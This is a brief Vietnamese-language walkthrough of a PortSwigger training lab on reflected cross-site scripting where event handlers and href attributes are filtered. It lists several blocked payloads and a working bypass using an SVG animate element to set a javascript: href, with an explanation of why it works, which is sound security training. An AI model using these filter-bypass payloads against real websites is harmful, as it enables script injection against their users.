# Lab: Reflected XSS with event handlers and href attributes blocked
- Category: XSS
- Độ khó: EXOERT
- Link lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

## Summary

## Step

Thử payload `<img src=x onerror=alert(1)>`, ``<svg onload=alert(1)>``, `<a href="javascript:alert(1)">Click</a>` đều bị `400`

Thử fuzz xem cái nào pass, nhận thấy thẻ không thì pass mà thêm các event handler vào thì lại bị block

![](../0_images/XSS/lab-event-handlers-and-href-attributes-blocked/Screenshot%20from%202026-11-20%2012-30-32.png)

![](../0_images/XSS/lab-event-handlers-and-href-attributes-blocked/Screenshot%20from%202026-11-20%2012-30-37.png)

Vì cái này chưa biết xử lý sao nên hỏi AI và nhạn được payload như này

```
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(1) />
    <text x=20 y=20>Click me</text>
  </a>
</svg>
```

Phân tích lại vấn đề:

Ta cần tạo một `<a>` có `href="javascript:alert(1)` mà không được viết `href`.
Thì SVG cung cấp cơ chế SMIL animation cho phép gán động các giá trị. Thẻ `<animate>` với:
- attributeName=href : chỉ định thuộc tính cần gán
- values=javascript:alert(1) -> giá trị sẽ gán

